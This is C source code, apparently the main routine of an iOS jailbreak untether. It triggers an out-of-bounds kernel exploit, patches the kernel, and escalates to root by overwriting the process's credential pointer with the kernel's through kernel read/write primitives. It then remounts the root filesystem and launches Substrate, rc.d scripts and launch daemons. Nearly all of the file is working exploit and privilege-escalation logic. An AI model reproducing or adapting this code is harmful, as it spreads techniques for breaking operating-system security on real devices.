#include "common.h"
#include "util.h"
#include "exploit.h"
#include "memory.h"
#include "patchfinder.h"
#include "patches.h"

int load_run_commands(void) {
    DIR *dir = opendir("/etc/rc.d");
    if (dir == NULL) return -1;

    struct dirent *entry = NULL;
    char path_buf[PATH_MAX] = {0};
    char *args[] = {path_buf, NULL};

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        bzero(path_buf, PATH_MAX);
        snprintf(path_buf, PATH_MAX-1, "/etc/rc.d/%s", entry->d_name);

        pid_t pid = -1;
        int rv = posix_spawn(&pid, path_buf, NULL, NULL, args, environ);
        if (rv != 0 || pid == -1) {
            print_log("[WARNING] failed to start: %s\n", path_buf);
        }
    }

    closedir(dir);
    return 0;
}

int load_user_daemons(void) {
    char *args[] = {"/bin/launchctl", "load", "/Library/LaunchDaemons", NULL};
    pid_t pid = -1;
    int status = -1;

    int rv = posix_spawn(&pid, args[0], NULL, NULL, args, environ);
    if (rv != 0 || pid == -1) {
        print_log("[ERROR] failed to start user daemons\n");
        return rv;
    }

    do { if (waitpid(pid, &status, 0) == -1) return status; }
    while (!WIFEXITED(status) && !WIFSIGNALED(status));
    return status;
}

int launchctl_unsetenv(void) {
    char *args[] = {"/bin/launchctl", "unsetenv", "DYLD_INSERT_LIBRARIES", NULL};
    pid_t pid = -1;
    int status = -1;

    int rv = posix_spawn(&pid, "/bin/launchctl", NULL, NULL, args, NULL);
    if (rv != 0 || pid == -1) return -1;
    
    do { if (waitpid(pid, &status, 0) == -1) return status; }
    while (!WIFEXITED(status) && !WIFSIGNALED(status));
    return status;
}

int start_daemons(void) {
    DIR *dir = opendir("/Library/LaunchDaemons");
    if (dir == NULL) return -1;

    struct dirent *entry = NULL;
    char path_buf[PATH_MAX] = {0};

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        if (strstr(entry->d_name, ".plist") == NULL) continue;

        bzero(path_buf, PATH_MAX);
        snprintf(path_buf, PATH_MAX, "/Library/LaunchDaemons/%s", entry->d_name);
        
        chmod(path_buf, 0644);
        chown(path_buf, 0, 0);
    }

    closedir(dir);
    sync();

    load_run_commands();
    if (access("/usr/libexec/substrate", F_OK) == 0) {
        char *args[] = {"/usr/libexec/substrate", NULL};
        pid_t pid = -1;
        int rv = posix_spawn(&pid, args[0], NULL, NULL, args, environ);
        if (rv != 0 || pid == -1) {
            print_log("[WARNING] failed to start substrate\n");
        }
    }

    if (kinfo->version[0] == 7) {
        if (access("/usr/libexec/CrashHousekeeping.backup", F_OK) == 0) {
            char *args[] = {"/usr/libexec/CrashHousekeeping.backup", NULL};
            pid_t pid = -1;
            int rv = posix_spawn(&pid, args[0], NULL, NULL, args, environ);
            if (rv != 0 || pid == -1) {
                print_log("[WARNING] failed to start CrashHousekeeping\n");
            }
        }
    }

    load_user_daemons();
    return 0;
}

int main(void) {
    setuid(0);
    setgid(0);

    uint32_t cpu_family = 0;
    size_t size = sizeof(cpu_family);
    sysctlbyname("hw.cpufamily", &cpu_family, &size, NULL, 0);

    if (run_oob_entry((cpu_family != CPUFAMILY_ARM_SWIFT)) != 0) {
        print_log("[-] exploit failed\n");
        return -1;
    }

    print_log("[*] exploit done\n");
    if (patch_kernel(false) != 0) {
        print_log("[-] failed to patch kernel\n");
        return -1;
    }

    if (kinfo->version[0] == 7) {
        uint32_t kern_ucred = kread32(kinfo->kern_proc_addr + 0x8c);
        uint32_t self_ucred = kread32(kinfo->self_proc_addr + 0x8c);
        kwrite32(kinfo->self_proc_addr + 0x8c, kern_ucred);
        setuid(0);
        setgid(0);

        char *dev = strdup("/dev/disk0s1s1");
        int rv = mount("hfs", "/", MNT_UPDATE, &dev);
        if (rv != 0) {
            for (int i = 0; i < 50; i++) {
                rv = mount("hfs", "/", MNT_UPDATE, &dev);
                if (rv == 0) break;
                usleep(10000);
            }
        }

        kwrite32(kinfo->self_proc_addr + 0x8c, self_ucred);
        print_log("[*] rootfs remounted\n");
    } else {
        launchctl_unsetenv();
    }

    print_log("[*] kernel patched\n");
    start_daemons();
    print_log("[*] done\n");
    return 0;
}